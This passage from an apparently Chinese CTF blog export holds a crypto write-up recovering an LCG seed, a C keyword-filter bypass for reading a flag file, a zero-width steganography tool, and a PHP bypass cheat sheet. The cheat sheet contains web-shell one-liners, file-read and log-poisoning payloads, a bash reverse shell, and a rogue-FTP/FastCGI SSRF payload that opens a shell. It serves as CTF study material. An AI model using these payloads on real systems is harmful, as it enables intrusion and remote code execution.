其中$A,B,M$是生成器设定的常数，$A$为乘数，$B$为增量，$M$为模数。 已知初始$seed_0$在生成器运行一次得到： $seed_1=(a\\times seed_0+b) \\% m$ $state_1=seed_1\\gt\\gt16$，即 $seed_1=(state_1\\lt\\lt16)+k_1$ 同样： $seed_2=(a\\times seed_1+b) \\% m$ $state_2=seed_2\\gt\\gt16$，即 $seed_2=(state_2\\lt\\lt16)+k_2$ 联立有： $state_2=(a \\times ((state_1 \\lt\\lt 16)+ k_1 ) + b) \\% m \\gt\\gt16 $ 已知 $a$，$b$，$m$，$state_1$，$state_2$，可以爆破得$k_1$： 123456789101112a = 3844066521b = 3316005024m = 2249804527state1 = 16269state2 = 4249for k in range(2**32): seed1 = (state1&lt;&lt;16)+k res = ((a*seed1+b)%m)&gt;&gt;16 if res==state2: print(seed1) break 而后续的gen_AB()是在以上面迭代两次后的$seed_2$为初始seed的，根据得到的$seed_1$计算$seed_2=278490266$，带入后续步骤即可。 123456789101112131415161718192021222324252627282930313233343536from Crypto.Util.number import *a = 3844066521b = 3316005024m = 2249804527state1 = 16269state2 = 4249class LCG: def __init__(self): self.a = 3844066521 self.b = 3316005024 self.m = 2249804527 self.seed = 278490266 def next(self): self.seed = (self.a*self.seed+self.b) % self.m return self.seed &gt;&gt; 16class DH: def __init__(self): self.lcg = LCG() self.g = 183096451267674849541594370111199688704 self.m = 102752586316294557951738800745394456033378966059875498971396396583576430992701 self.A, self.a = self.gen_AB() self.B, self.b = self.gen_AB() self.key = pow(self.A, self.b, self.m) def gen_AB(self): x = &#x27;&#x27; for _ in range(64): x += &#x27;1&#x27; if self.lcg.next() % 2 else &#x27;0&#x27; return pow(self.g, int(x, 2), self.m), int(x, 2)Cipher = 13040004482819935755130996285494678592830702618071750116744173145400949521388647864913527703DH = DH()print(&quot;flag = &#123;&#125;&quot;.format(long_to_bytes(Cipher ^ DH.key))) PWNTaQiniOj-0nc交互题。 用C语言写语句，读取flag.txt的内容。 测试发现禁用了关键字home|ctf|flag，直接字符串分割绕过： 12345678910111213141516#include&lt;stdio.h&gt;#include&lt;string.h&gt;void main() &#123; FILE *fp; char str[100]; char path[50] =&quot;/ho&quot;; char path2[50]=&quot;me/ct&quot;; char path3[50]=&quot;f/fl&quot;; char path4[50]=&quot;ag&quot;; strcat(path3,path4); strcat(path2,path3); strcat(path,path2); fp = fopen(path, &quot;r&quot;); fgets(str,100,fp); printf(&quot;%s\\n&quot;,str);&#125;","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"零宽度字符隐写","slug":"misc-零宽度字符隐写","date":"2020-05-23T16:27:12.000Z","updated":"2022-12-09T15:08:13.581Z","comments":true,"path":"2020/05/24/misc-零宽度字符隐写/","link":"","permalink":"https://lazzzaro.github.io/2020/05/24/misc-%E9%9B%B6%E5%AE%BD%E5%BA%A6%E5%AD%97%E7%AC%A6%E9%9A%90%E5%86%99/","excerpt":"","text":"零宽度字符隐写/零宽度空格隐写/零宽度空间隐写/零宽隐写零宽度字符隐写术（Zero-Width Space Steganography）： 将隐藏消息编码和解码为不可打印/可读字符。 字符包括： 零宽度空格（\\u200b） 零宽度非连接符（\\u200c） 零宽度连接符（\\u200d） 从左至右书写标记（\\u200e） 从右至左书写标记（\\u200f） 解密 在线工具https://www.mzy0.com/ctftools/zerowidth1/ http://330k.github.io/misc_tools/unicode_steganography.html https://offdev.net/demos/zwsp-steg-js https://yuanfux.github.io/zero-width-web/ http://www.atoolbox.net/Tool.php?Id=829 其他工具 zwsp-steg-py https://github.com/enodari/zwsp-steg-py 转换 转化为二进制的加密：https://zhuanlan.zhihu.com/p/87919817 转化为Morse编码的加密：https://zhuanlan.zhihu.com/p/75992161 JS脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229/** * Zero-Width Unicode Character Steganography * Copyright (c) 2015-2016 Kei Misawa * This software is released under the MIT License. * http://opensource.org/licenses/mit-license.php */(function(exports)&#123; &#x27;use strict&#x27;; var chars = []; var radix = 0; var codelengthText = 0; var codelengthBinary = 0; /** Set characters of coded hidden text(zero width characters) args: string of zero width characters return: null */ var setUseChars = function(newchars)&#123; if(newchars.length &gt;= 2)&#123; chars = newchars.split(&#x27;&#x27;); radix = chars.length; codelengthText = Math.ceil(Math.log(65536) / Math.log(radix)); codelengthBinary = Math.ceil(Math.log(256) / Math.log(radix)); &#125; return null; &#125;; /** Text Encoder args: text: original text to be embedded (String) data: text to be hidden (String) return: unicode stego text */ var encodeText = function(text1, text2)&#123; return combine_shuffle_string(text1, encode_to_zerowidth_characters_text(text2), codelengthText); &#125;; /** Binary Encoder args: text: original text to be embedded (String) data: data to be hidden (Uint8Array) return: unicode stego text */ var encodeBinary = function(text, data)&#123; return combine_shuffle_string(text, encode_to_zerowidth_characters_binary(data), codelengthBinary); &#125;; /** Text Decoder args: unicode text with steganography (String) return: JavaScript Object &#123; originalText: original text (String), hiddenText: hidden data (String) &#125; */ var decodeText = function(text)&#123; var splitted = split_zerowidth_characters(text); return &#123; &#x27;originalText&#x27;: splitted.originalText, &#x27;hiddenText&#x27;: decode_from_zero_width_characters_text(splitted.hiddenText, codelengthText) &#125;; &#125;; /** Binary Decoder args: unicode text with steganography (String) return: JavaScript Object &#123; originalText: original text (String), hiddenData: hidden data (Uint8Array) &#125; */ var decodeBinary = function(text)&#123; var splitted = split_zerowidth_characters(text); return &#123; &#x27;originalText&#x27;: splitted.originalText, &#x27;hiddenData&#x27;: decode_from_zero_width_characters_binary(splitted.hiddenText) &#125;; &#125;; setUseChars(&#x27;\\u200c\\u200d\\u202c\\ufeff&#x27;); exports.unicodeSteganographer = &#123; encodeText: encodeText, decodeText: decodeText, encodeBinary: encodeBinary, decodeBinary: decodeBinary, setUseChars: setUseChars &#125;; /** Internal Functions */ var encode_to_zerowidth_characters_text = function(str1)&#123; var result = new Array(str1.length); var base = &#x27;&#x27;; var i; var c; var d; var r; //var base = &#x27;0&#x27;.repeat(codelength); // IE not support this method for(i = 0; i &lt; codelengthText; i++)&#123; base += &#x27;0&#x27;; &#125; for(i = 0; i &lt; str1.length; i++)&#123; c = str1.charCodeAt(i); d = c.toString(radix); result[i] = (base + d).substr(-codelengthText); &#125; r = result.join(&#x27;&#x27;); for(i = 0; i &lt; radix; i++)&#123; r = r.replace(new RegExp(i, &#x27;g&#x27;), chars[i]); &#125; return r; &#125;; var encode_to_zerowidth_characters_binary = function(u8ary)&#123; var result = new Array(u8ary.length); var base = &#x27;&#x27;; var i; var c; var d; var r; for(i = 0; i &lt; codelengthBinary; i++)&#123; base += &#x27;0&#x27;; &#125; for(i = 0; i &lt; u8ary.length; i++)&#123; d = u8ary[i].toString(radix); result[i] = (base + d).substr(-codelengthBinary); &#125; r = result.join(&#x27;&#x27;); for(i = 0; i &lt; radix; i++)&#123; r = r.replace(new RegExp(i, &#x27;g&#x27;), chars[i]); &#125; return r; &#125;; var combine_shuffle_string = function(str1, str2, codelength)&#123; var result = []; var c0 = str1.split(/([\\u0000-\\u002F\\u003A-\\u0040\\u005b-\\u0060\\u007b-\\u007f])|([\\u0030-\\u0039]+)|([\\u0041-\\u005a\\u0061-\\u007a]+)|([\\u0080-\\u00FF]+)|([\\u0100-\\u017F]+)|([\\u0180-\\u024F]+)|([\\u0250-\\u02AF]+)|([\\u02B0-\\u02FF]+)|([\\u0300-\\u036F]+)|([\\u0370-\\u03FF]+)|([\\u0400-\\u04FF]+)|([\\u0500-\\u052F]+)|([\\u0530-\\u058F]+)|([\\u0590-\\u05FF]+)|([\\u0600-\\u06FF]+)|([\\u0700-\\u074F]+)|([\\u0750-\\u077F]+)|([\\u0780-\\u07BF]+)|([\\u07C0-\\u07FF]+)|([\\u0800-\\u083F]+)|([\\u0840-\\u085F]+)|([\\u08A0-\\u08FF]+)|([\\u0900-\\u097F]+)|([\\u0980-\\u09FF]+)|([\\u0A00-\\u0A7F]+)|([\\u0A80-\\u0AFF]+)|([\\u0B00-\\u0B7F]+)|([\\u0B80-\\u0BFF]+)|([\\u0C00-\\u0C7F]+)|([\\u0C80-\\u0CFF]+)|([\\u0D00-\\u0D7F]+)|([\\u0D80-\\u0DFF]+)|([\\u0E00-\\u0E7F]+)|([\\u0E80-\\u0EFF]+)|([\\u0F00-\\u0FFF]+)|([\\u1000-\\u109F]+)|([\\u10A0-\\u10FF]+)|([\\u1100-\\u11FF]+)|([\\u1200-\\u137F]+)|([\\u1380-\\u139F]+)|([\\u13A0-\\u13FF]+)|([\\u1400-\\u167F]+)|([\\u1680-\\u169F]+)|([\\u16A0-\\u16FF]+)|([\\u1700-\\u171F]+)|([\\u1720-\\u173F]+)|([\\u1740-\\u175F]+)|([\\u1760-\\u177F]+)|([\\u1780-\\u17FF]+)|([\\u1800-\\u18AF]+)|([\\u18B0-\\u18FF]+)|([\\u1900-\\u194F]+)|([\\u1950-\\u197F]+)|([\\u1980-\\u19DF]+)|([\\u19E0-\\u19FF]+)|([\\u1A00-\\u1A1F]+)|([\\u1A20-\\u1AAF]+)|([\\u1AB0-\\u1AFF]+)|([\\u1B00-\\u1B7F]+)|([\\u1B80-\\u1BBF]+)|([\\u1BC0-\\u1BFF]+)|([\\u1C00-\\u1C4F]+)|([\\u1C50-\\u1C7F]+)|([\\u1CC0-\\u1CCF]+)|([\\u1CD0-\\u1CFF]+)|([\\u1D00-\\u1D7F]+)|([\\u1D80-\\u1DBF]+)|([\\u1DC0-\\u1DFF]+)|([\\u1E00-\\u1EFF]+)|([\\u1F00-\\u1FFF]+)|([\\u2000-\\u206F]+)|([\\u2070-\\u209F]+)|([\\u20A0-\\u20CF]+)|([\\u20D0-\\u20FF]+)|([\\u2100-\\u214F]+)|([\\u2150-\\u218F]+)|([\\u2190-\\u21FF]+)|([\\u2200-\\u22FF]+)|([\\u2300-\\u23FF]+)|([\\u2400-\\u243F]+)|([\\u2440-\\u245F]+)|([\\u2460-\\u24FF]+)|([\\u2500-\\u257F]+)|([\\u2580-\\u259F]+)|([\\u25A0-\\u25FF]+)|([\\u2600-\\u26FF]+)|([\\u2700-\\u27BF]+)|([\\u27C0-\\u27EF]+)|([\\u27F0-\\u27FF]+)|([\\u2800-\\u28FF]+)|([\\u2900-\\u297F]+)|([\\u2980-\\u29FF]+)|([\\u2A00-\\u2AFF]+)|([\\u2B00-\\u2BFF]+)|([\\u2C00-\\u2C5F]+)|([\\u2C60-\\u2C7F]+)|([\\u2C80-\\u2CFF]+)|([\\u2D00-\\u2D2F]+)|([\\u2D30-\\u2D7F]+)|([\\u2D80-\\u2DDF]+)|([\\u2DE0-\\u2DFF]+)|([\\u2E00-\\u2E7F]+)|([\\u2E80-\\u2EFF]+)|([\\u2F00-\\u2FDF]+)|([\\u2FF0-\\u2FFF]+)|([\\u3000-\\u303F]+)|([\\u3040-\\u309F]+)|([\\u30A0-\\u30FF]+)|([\\u3100-\\u312F]+)|([\\u3130-\\u318F]+)|([\\u3190-\\u319F]+)|([\\u31A0-\\u31BF]+)|([\\u31C0-\\u31EF]+)|([\\u31F0-\\u31FF]+)|([\\u3200-\\u32FF]+)|([\\u3300-\\u33FF]+)|([\\u3400-\\u4DBF]+)|([\\u4DC0-\\u4DFF]+)|([\\u4E00-\\u9FFF]+)|([\\uA000-\\uA48F]+)|([\\uA490-\\uA4CF]+)|([\\uA4D0-\\uA4FF]+)|([\\uA500-\\uA63F]+)|([\\uA640-\\uA69F]+)|([\\uA6A0-\\uA6FF]+)|([\\uA700-\\uA71F]+)|([\\uA720-\\uA7FF]+)|([\\uA800-\\uA82F]+)|([\\uA830-\\uA83F]+)|([\\uA840-\\uA87F]+)|([\\uA880-\\uA8DF]+)|([\\uA8E0-\\uA8FF]+)|([\\uA900-\\uA92F]+)|([\\uA930-\\uA95F]+)|([\\uA960-\\uA97F]+)|([\\uA980-\\uA9DF]+)|([\\uA9E0-\\uA9FF]+)|([\\uAA00-\\uAA5F]+)|([\\uAA60-\\uAA7F]+)|([\\uAA80-\\uAADF]+)|([\\uAAE0-\\uAAFF]+)|([\\uAB00-\\uAB2F]+)|([\\uAB30-\\uAB6F]+)|([\\uAB70-\\uABBF]+)|([\\uABC0-\\uABFF]+)|([\\uAC00-\\uD7AF]+)|([\\uD7B0-\\uD7FF]+)|([\\uD800-\\uDFFF]+)|([\\uE000-\\uF8FF]+)|([\\uF900-\\uFAFF]+)|([\\uFB00-\\uFB4F]+)|([\\uFB50-\\uFDFF]+)|([\\uFE00-\\uFE0F]+)|([\\uFE10-\\uFE1F]+)|([\\uFE20-\\uFE2F]+)|([\\uFE30-\\uFE4F]+)|([\\uFE50-\\uFE6F]+)|([\\uFE70-\\uFEFF]+)|([\\uFF00-\\uFFEF]+)|([\\uFFF0-\\uFFFF]+)/g); var c1 = []; var i; var j; for(i = 0; i &lt; c0.length; i++)&#123; if((typeof c0[i] !== &#x27;undefined&#x27;) &amp;&amp; (c0[i] !== &#x27;&#x27;))&#123; c1.push(c0[i]); &#125; &#125; var c2 = str2.split(new RegExp(&#x27;(.&#123;&#x27; + codelength + &#x27;&#125;)&#x27;, &#x27;g&#x27;)); var ratio = c1.length / (c1.length + c2.length); /* slow while((c1.length &gt; 0) &amp;&amp; (c2.length &gt; 0))&#123; if(Math.random() &lt;= ratio)&#123; result.push(c1.shift()); &#125;else&#123; result.push(c2.shift()); &#125; &#125;*/ i = 0; j = 0; while((i &lt; c1.length) &amp;&amp; (j &lt; c2.length))&#123; if(Math.random() &lt;= ratio)&#123; result.push(c1[i]); i++; &#125;else&#123; result.push(c2[j]); j++; &#125; &#125; c1 = c1.slice(i); c2 = c2.slice(j); result = result.concat(c1).concat(c2); return result.join(&#x27;&#x27;); &#125;; var split_zerowidth_characters = function(str1)&#123; var result = &#123;&#125;; result.originalText = str1.replace(new RegExp(&#x27;[&#x27; + chars.join(&#x27;&#x27;) + &#x27;]&#x27;, &#x27;g&#x27;), &#x27;&#x27;); result.hiddenText = str1.replace(new RegExp(&#x27;[^&#x27; + chars.join(&#x27;&#x27;) + &#x27;]&#x27;, &#x27;g&#x27;), &#x27;&#x27;); return result; &#125;; var decode_from_zero_width_characters_text = function(str1)&#123; var r = str1; var i; var result = []; for(i = 0; i &lt; radix; i++)&#123; r = r.replace(new RegExp(chars[i], &#x27;g&#x27;), i); &#125; for(i = 0; i &lt; r.length; i += codelengthText)&#123; result.push(String.fromCharCode(parseInt(r.substr(i, codelengthText), radix))); &#125; return result.join(&#x27;&#x27;); &#125;; var decode_from_zero_width_characters_binary = function(str1)&#123; var r = str1; var i; var j; var result = new Uint8Array(Math.ceil(str1.length / codelengthBinary)); for(i = 0; i &lt; radix; i++)&#123; r = r.replace(new RegExp(chars[i], &#x27;g&#x27;), i); &#125; for(i = 0, j = 0; i &lt; r.length; i += codelengthBinary, j++)&#123; result[j] = parseInt(r.substr(i, codelengthBinary), radix); &#125; return result; &#125;; return null;&#125;)(this);var s = unicodeSteganographers.setUseChars(&#x27;\\u200b\\u200c\\u200d\\u200e\\u200f&#x27;);s.decodeText(&quot;我已经看见了，​​​​‎‏​​​​​‏​‍​​​​‏‍‌​​​​‏‍‏​​​​‎‏​​​​​‏‏‌​​​​‏‍‌​​​​‏‎‍​​​​‌‌‎​​​​‎‏‏​​​​‏‍‌​​​​‏‍​​​​​‏​‎​​​​‏‍‏​​​​‎‏‍​​​​‏‎‌​​​​‏‎‍​​​​‏‌‎​​​​‎‏‍​​​​‏‎‌​​​​‏​‌​​​‌​​​你呢？&quot;)","categories":[{"name":"misc","slug":"misc","permalink":"https://lazzzaro.github.io/categories/misc/"}],"tags":[{"name":"隐写","slug":"隐写","permalink":"https://lazzzaro.github.io/tags/%E9%9A%90%E5%86%99/"}],"author":"Lazzaro"},{"title":"PHP绕过","slug":"web-PHP绕过","date":"2020-05-18T11:29:09.000Z","updated":"2022-12-20T11:44:33.199Z","comments":true,"path":"2020/05/18/web-PHP绕过/","link":"","permalink":"https://lazzzaro.github.io/2020/05/18/web-PHP%E7%BB%95%E8%BF%87/","excerpt":"","text":"常用函数phpinfo() #PHP配置页 file_get_contents() #获取文件内容 get_defined_vars() #获取所有文件（包括包含的文件）变量的值 ​ 变种一句话PHP $_GET[a]($_GET[b]); ​ 常用php://filter过滤器 无过滤器 php://filter/resource= 字符串过滤器 php://filter/read=string.rot13/resource= php://filter/read=string.toupper/resource= php://filter/read=string.tolower/resource= php://filter/read=string.string_tags/resource= 转换过滤器 php://filter/read=convert.base64-encode/resource= php://filter/read=convert.quoted-printable-encode/resource= ​ 常用路径 Nginx 123456日志：/var/log/nginx/access.log配置：/etc/nginx/nginx.conf/usr/local/nginx/conf/nginx.conf Apache 1234567891011日志：/var/log/apache/access.log/var/log/apache2/access.log/var/www/logs/access.log/var/log/access.log/etc/httpd/logs/access_log/var/log/httpd/access_log配置：/etc/apache2/apache2.conf/etc/httpd/conf/httpd.conf ​ 绕过关键词 函数名、方法名、类名、关键字不区分大小写 &lt;?php Show_source(&#39;index.php&#39;);?&gt; 动态特性 &lt;?php base64_decode(&#39;c2hvd19zb3VyY2U=&#39;)(&#39;index.php&#39;);?&gt; &lt;?php echo (&#39;fil&#39;.&#39;e_get_contents&#39;)(&#39;/var/www/html/index.php&#39;);?&gt; 16进制 &lt;?php (&quot;\\x70\\x68\\x70\\x69\\x6e\\x66\\x6f&quot;)();?&gt; 溢出32位：-2147483648 ~ 2147483647 64位：-9223372036854775808 ~ 9223372036854775807 本地访问X-Forwarded-For, X-Client-ip, Client-ip, X-Real-IP 请求方法查看支持请求方法：OPTIONS 任意文件上传：PUT intval() 进制转换 十六进制：0x??? 二进制：0b??? 八进制：0??? is_numeric() 特殊字符 空格、%00、%0a preg_match() 换行符 %0a（按行匹配类） preg_match值只匹配第一行，对于/^xxx$/类型，在前端或末尾加上%0a即可绕过。 命名空间（\\） 在PHP的命名空间默认为\\，所有的函数和类都在\\这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。 123#例&lt;?php namespace ccc;\\eval($_REQUEST[&#x27;a&#x27;]);&lt;?php \\system(&#x27;cat /tmp/flag_XXXX&#x27;); 参考：Code-Breaking Puzzles 题解&amp;学习篇 符号 分号：?&gt;闭合 小括号： ?c=include $_GET[x]?&gt;&amp;x=php://filter/read=convert.base64-encode/resource=index.php ?c=require $_GET[x]?&gt;&amp;x=php://filter/read=convert.base64-encode/resource=index.php 数组 preg_match只能处理字符串，当传入的subject是数组时会返回false。 PCRE回溯次数限制 参考：PHP利用PCRE回溯次数限制绕过某些安全限制 pcre.backtrack_limit给pcre设定了一个回溯次数上限，默认为1000000，如果回溯次数超过这个数字，preg_match会返回false。 in_array() 命名空间（\\） 在PHP的命名空间默认为\\，所有的函数和类都在\\这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。 123#例&lt;?php namespace ccc;\\eval($_REQUEST[&#x27;a&#x27;]);&lt;?php \\system(&#x27;cat /tmp/flag_XXXX&#x27;); 参考：Code-Breaking-Puzzles-题解-学习篇 $_SERVER[‘QUERY_STRING’] URL编码 $_SERVER[‘QUERY_STRING’]不会进行URLDecode。 变量覆盖 ?_POST[key1]=36d&amp;_POST[key2]=36d $_REQUEST POST覆盖 $_REQUEST同时接受GET和POST的数据，并且POST具有更高的优先值，只需要同时GET和POST有相同的参数，在检测时POST的值就会覆盖GET的值从而绕过。 file_get_contents() 使用 php://input 或 data://text/plain,xxx 写文件 file_put_contents() 攻击php-fpm（未授权访问漏洞） 如果目标主机上正在运行着 PHP-FPM，并且有一个file_put_contents()函数的参数是可控的，可以使用 FTP 协议的被动模式：客户端试图从FTP服务器上读取/写入一个文件，服务器会通知客户端将文件的内容读取到一个指定的IP和端口上，我们可以指定到127.0.0.1:9000，这样就可以向目标主机的 PHP-FPM 发送一个任意的数据包，从而执行代码，造成SSRF。 file_put_contents($_GET[&#39;file&#39;], $_GET[&#39;data&#39;]); 先用 gopherus 生成一个反弹shell的payload，截取 _ 后面的部分 /var/www/html/index.php bash -c &quot;bash -i &gt;&amp; /dev/tcp/[IP]/[Port] 0&gt;&amp;1&quot; 关于FTP的返回码，我们看到227： Entering Passive Mode &lt;h1,h2,h3,h4,p1,p2&gt; 进入被动模式(h1,h2,h3,h4,p1,p2) 我们可以用来进入被动模式，h和p分别为地址和端口，搭建一个恶意的 ftp 服务器： 123456789101112131415import sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((&#x27;0.0.0.0&#x27;, 123))s.listen(1)conn, addr = s.accept()conn.send(b&#x27;220 welcome\\n&#x27;)conn.send(b&#x27;331 Please specify the password.\\n&#x27;)conn.send(b&#x27;230 Login successful.\\n&#x27;)conn.send(b&#x27;200 Switching to Binary mode.\\n&#x27;)conn.send(b&#x27;550 Could not get the file size.\\n&#x27;)conn.send(b&#x27;150 ok\\n&#x27;)conn.send(b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9001)\\n&#x27;) #STOR / (2)conn.send(b&#x27;150 Permission denied.\\n&#x27;)conn.send(b&#x27;221 Goodbye.\\n&#x27;)conn.close() 启动服务器之后再监听反弹的端口： http://ip:8080/ftp.php?file=ftp://@ip:123/&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%0F%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH107%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F!SCRIPT_FILENAME/usr/share/nginx/html/phpinfo.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00k%04%00%3C%3Fphp%20system(%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/ip/1234%200%3E%261%22%27)%3Bdie(%27-----Made-by-SpyD3r-----%0A%27)%3B%3F%3E%00%00%00%00 参考：教你用 FTP SSRF 打穿内网 array绕过关键字 file_put_contents的data参数可以是个array，可以通过构造特别的get请求来发送一个data的array来绕过。 file_put_contents(file,data,mode,context) | 参数 | 描述 || :——- | :—————————————————————————————- || file | 必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。 || data | 可选。规定要写入文件的数据。可以是字符串、数组或数据流。 | 12for i in range(len(s)): params[&#x27;data[&#123;i&#125;]&#x27;.format(i=str(i))]=bytes([s[i]]) sha1()比较 以数组为参数 sha1()函数无法处理数组类型，将报错并返回false。 特殊情况汇总 10932435112: 0e07766915004133176347055865026311692244aaroZmOk: 0e66507019969427134894567494305185566735aaK1STfY: 0e76658526655756207688271159624026011393aaO8zKZF: 0e89257456677279068558073954252716165668aa3OFF9m: 0e36977786278517984959260394024281014729 0e1290633704: 0e19985187802402577070739524195726831799 md5()比较 比较缺陷利用（限==弱类型情况） QNKCDZO - 0e830400451993494058024219903391 PJNPDWY: 0e291529052894702774557631701704NWWKITQ: 0e763082070976038347657360817689NOOPCJF: 0e818888003657176127862245791911MMHUWUV: 0e701732711630150438129209816536MAUXXQC: 0e478478466848439040434801845361IHKFRNS: 0e256160682445802696926137988570GZECLQZ: 0e537612333747236407713628225676GGHMVOE: 0e362766013028313274586933780773GEGHBXL: 0e248776895502908863709684713578EEIZDOI: 0e782601363539291779881938479162DYAXWCA: 0e424759758842488633464374063001DQWRASX: 0e742373665639232907775599582643BRTKUJZ: 00e57640477961333848717747276704ABJIHVY: 0e755264355178451322893275696586 240610708 - 0e462097431906509019562988736854s878926199a - 0e545993274517709034328855841020s155964671a - 0e342768416822451524974117254469s214587387a - 0e848240448830537924465865611904s878926199a - 0e545993274517709034328855841020s1091221200a - 0e940624217856561557816327384675 aaaXXAYW: 0e540853622400160407992788832284aabg7XSs: 0e087386482136013740957780965295aabC9RqS: 0e041022518165728065344349536299 0e215962017 - 0e291242476940776845150308577824 比较缺陷利用（限===强类型情况） 工具：fastcoll 两组经过url编码后的值： 123a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 以数组为参数 md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL，也就是相等的。 NaN 和 INF NAN和INF，分别为非数字和无穷大，但是var_dump一下它们的数据类型却是double，那么在md5函数处理它们的时候，是将其直接转换为字符串”NAN”和字符串”INF”使用的，但是它们拥有特殊的性质，它们与任何数据类型（除了true）做强类型或弱类型比较均为false，甚至NAN===NAN都是false，但md5(&#39;NaN&#39;)===md5(&#39;NaN&#39;)为true。 md5(string,raw) md5(string,raw) string 必需。规定要计算的字符串。raw 可选。规定十六进制或二进制输出格式：TRUE - 原始 16 字符二进制格式；FALSE - 默认，32 字符十六进制数。 ffifdyop，经过md5函数后结果为 &#39;or&#39;6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c； 129581926211651571912466741651878684928，经过md5函数后结果为 \\x06\\xdaT0D\\x9f\\x8fo#\\xdf\\xc1&#39;or&#39;8； create_function() 代码注入 源码 $func(&#39;&#39;,$arg) ： $func=&#39;create_function&#39;; $arg=&#39;2;&#125;phpinfo();//&#39; 或 $arg=&#39;2;&#125;require(base64_decode(xxx));var_dump(get_defined_vars());// 返回值：匿名函数 $func = create_function(&quot;&quot;,&quot;die(&#39;end.&#39;);&quot;); 创建一个$func的匿名函数，函数的作用是输出字符串。 匿名函数有真正的名字，为%00lambda_%d （%d格式化为当前进程的第n个匿名函数，n的范围0-999） call_user_func() 调用类静态方法 call_user_func(&#39;Func::_One&#39;,&#39;one&#39;) call_user_func([&#39;Func&#39;,&#39;_One&#39;]) 参考：https://cloud.tencent.com/developer/article/1411010 escapeshellarg() escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符。 不可见字符插入（%80-%ff） escapeshellcmd() escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义；反斜线（\\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$, \\x0A, \\xFF；&#39; 和 &quot; 仅在不配对儿的时候被转义；在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。 escapeshellarg()+escapeshellcmd() 配对： 多个参数注入：PHP escapeshellarg()+escapeshellcmd() 之殇 ereg() / eregi() NULL截断漏洞 ereg()函数存在NULL截断漏洞,可以%00截断，遇到%00则默认为字符串的结束，所以可以绕过一些正则表达式的检查。 ereg()只能处理字符串的，遇到数组做参数返回NULL。 strpos() 以数组为参数 strpos()函数如果传入数组，便会返回NULL。 二次编码绕关键字 参考：https://bugs.php.net/bug.php?id=76671 strcmp() 函数缺陷 strcmp()函数比较两个字符串(区分大小写），定义中是比较字符串类型的，但如果输入其他类型这个函数将发生错误，在官方文档的说明中说到在php 5.2版本之前，利用strcmp函数将数组与字符串进行比较会返回-1，但是从5.3开始，会返回0。 add_slashes() $&#123;phpinfo()&#125; preg_replace() 代码执行（限/e模式） preg_replace(PHP 5.5)功能 ： 函数执行一个正则表达式的搜索和替换定义 ： mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject )搜索 subject 中匹配 pattern 的部分， 如果匹配成功以 replacement 进行替换$pattern 存在 /e 模式修正符，允许代码执行/e 模式修正符，是 preg_replace() 将 $replacement 当做php代码来执行 filter_var() FILTER_VALIDATE_EMAIL 形式：local-part@domain-part 邮箱local-part部分可以用双引号包裹，双引号内即可填入任意字符，如&quot;Joe&#39;Blow&quot;@example.com FILTER_VALIDATE_URL 0://www.baidu.com; is_file() / file_exists() 超过20次软链接后可以绕过： ?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php require_once() 包含的软连接层数较多时，hash匹配会直接失效造成重复包含，同 is_file() 参考：php源码分析 require_once 绕过不能重复包含文件的限制 include() 日志包含 URL：?x=/var/log/nginx/access.log 修改User-Agent为&lt;?php highlight_file(&#39;xxx.php&#39;); ?&gt; 有后缀绕过 ?c=data:text/plain,&lt;?php system(&#39;ls&#39;)?&gt; 